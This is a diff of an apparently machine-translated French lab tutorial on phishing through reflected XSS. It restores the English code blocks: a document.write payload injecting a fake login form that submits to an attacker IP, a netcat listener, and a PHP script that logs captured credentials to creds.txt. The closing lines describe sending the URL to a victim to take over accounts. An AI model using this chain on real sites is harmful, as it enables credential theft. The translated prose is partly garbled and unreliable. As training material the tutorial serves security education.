@@ -36,13 +36,12 @@ Nous pouvons facilement trouver un code HTML pour un formulaire de connexion de 
 Code: HTML
 
 ```
-<h3> Veuillez vous connecter pour continuer </h3>
-<Form Action = http: // our_ip>
-     <input type = "username" name = "username" placeholder = "username">
-     <entrée type = "mot de passe" name = "mot de passe" placeholder = "mot de passe">
-     <input type = "soumi" name = "soumi" value = "login">
-</ form>
-
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
 ```
 
 Dans le code HTML ci-dessus, `our_ip` est l'IP de notre machine virtuelle, que nous pouvons trouver avec la commande (` ip a`) sous `tun0`. Nous écouterons plus tard sur cette IP pour récupérer les informations d'identification envoyées du formulaire. Le formulaire de connexion doit ressembler à la suivante:
@@ -51,11 +50,11 @@ Code: HTML
 
 ```
 <div>
-<h3> Veuillez vous connecter pour continuer </h3>
-<input type = "text" placeholder = "username">
-<input type = "text" placeholder = "mot de passe">
-<input type = "soumi" value = "login">
-<br> <br>
+<h3>Please login to continue</h3>
+<input type="text" placeholder="Username">
+<input type="text" placeholder="Password">
+<input type="submit" value="Login">
+<br><br>
 </div>
 
 ```
@@ -65,7 +64,7 @@ Ensuite, nous devons préparer notre code XSS et le tester sur le formulaire vul
 Code: JavaScript
 
 ```
-document.write ('<h3> Veuillez vous connecter pour continuer </h3> <formulaire Action = http: // our_ip> <input type = "username" name = "username" placeholder = "username"> <input type = "mot de passe "name =" mot de passe "placeholder =" mot de passe "> <input type =" soumide "name =" soumi "value =" login "> </ form> ');
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 ```
 
 Nous pouvons maintenant injecter ce code JavaScript en utilisant notre charge utile XSS (c'est-à-dire au lieu d'exécuter le code JavaScript `alert (window.origin). Dans ce cas, nous exploitons une vulnérabilité `` reflétée XSS ', afin que nous puissions copier l'URL et notre charge utile XSS dans ses paramètres, comme nous l'avons fait dans la section «XSS» réfléchie, et la page devrait ressembler à ce qui suit lorsque nous Visitez l'URL malveillante:
@@ -87,9 +86,9 @@ Comme nous le voyons à la fois dans le code source et le texte de survol, le fo
 Code: HTML
 
 ```
-<form role = "form" action = "index.php" méthode = "get" id = 'urlform'>
-     <input type = "text" placeholder = "Image url" name = "url">
-</ form>
+<form role="form" action="index.php" method="GET" id='urlform'>
+    <input type="text" placeholder="Image URL" name="url">
+</form>
 ```
 
 Ainsi, nous pouvons désormais utiliser cet ID avec la fonction `retire ()` pour supprimer le formulaire URL:
@@ -144,11 +143,10 @@ dsgsec @ htb [/ htb] $ sudo nc -lvnp 80
 Maintenant, essayons de vous connecter avec les informations d'identification «Test: Test» et vérifiez la sortie «NetCat» que nous obtenons («N'oubliez pas de remplacer notre_IP dans la charge utile XSS par votre ip» réel »):
 
 ```
-Connectez-vous à [10.10.xx.xx] depuis (inconnu) [10.10.xx.xx] xxxxx
-Get /? Username = test & mot de passe = test et soumission = connecter http / 1.1
-Hôte: 10.10.xx.xx
-...COUPER...
-
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
+GET /?username=test&password=test&submit=Login HTTP/1.1
+Host: 10.10.XX.XX
+...SNIP...
 ```
 
 Comme nous pouvons le voir, nous pouvons capturer les informations d'identification dans l'URL de la demande HTTP (`/? Username = test & mot de passe = test`). Si une victime tente de se connecter avec le formulaire, nous obtiendrons ses informations d'identification.
@@ -160,26 +158,25 @@ Le script PHP suivant doit faire ce dont nous avons besoin, et nous l'écrire da
 Code: php
 
 ```
-<? Php
-if (isset ($ _ get ['username']) && isset ($ _ get ['mot de passe'])) {
-     $ file = fopen ("creds.txt", "a +");
-     fputs ($ file, "nom d'utilisateur: {$ _get ['username']} | mot de passe: {$ _get ['mot de passe']} \ n");
-     En-tête ("Emplacement: http: //server_ip/phishing/index.php");
-     fclose (fichier $);
-     sortie();
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
 }
 ?>
-
 ```
 
 Maintenant que nous avons notre fichier index.php »prêt, nous pouvons démarrer un serveur d'écoute` php », que nous pouvons utiliser au lieu de l'écouteur de base` NetCat »que nous avons utilisé plus tôt:
 
 ```
-dsgsec @ htb [/ htb] $ mkdir / tmp / tmpServer
-dsgsec @ htb [/ htb] $ cd / tmp / tmpServer
-dsgsec @ htb [/ htb] $ vi index.php #at cette étape, nous avons écrit notre fichier index.php
-dsgsec @ htb [/ htb] $ sudo php -s 0.0.0.0:80
-PHP 7.4.15 Server de développement (http://0.0.0.0:80) a commencé
+dsgsec@htb[/htb]$ mkdir /tmp/tmpserver
+dsgsec@htb[/htb]$ cd /tmp/tmpserver
+dsgsec@htb[/htb]$ vi index.php #at this step we wrote our index.php file
+dsgsec@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ```
 
 Essayons de vous connecter au formulaire de connexion injecté et voyons ce que nous obtenons. Nous voyons que nous sommes redirigés vers la page d'image d'image d'origine:
@@ -189,9 +186,8 @@ Essayons de vous connecter au formulaire de connexion injecté et voyons ce que 
 Si nous vérifions le fichier `Creds.txt` dans notre PWNNOX, nous voyons que nous avons obtenu les informations d'identification de connexion:
 
 ```
-dsgsec @ htb [/ htb] $ CAT Creds.txt
-Nom d'utilisateur: test | Passord: tester
-
+dsgsec@htb[/htb]$ cat creds.txt
+Username: test | Password: test
 ```
 
 Avec tout prêt, nous pouvons démarrer notre serveur PHP et envoyer l'URL qui inclut notre charge utile XSS à notre victime, et une fois qu'ils se connectent au formulaire, nous obtiendrons leurs informations d'identification et les utiliserons pour accéder à leurs comptes.
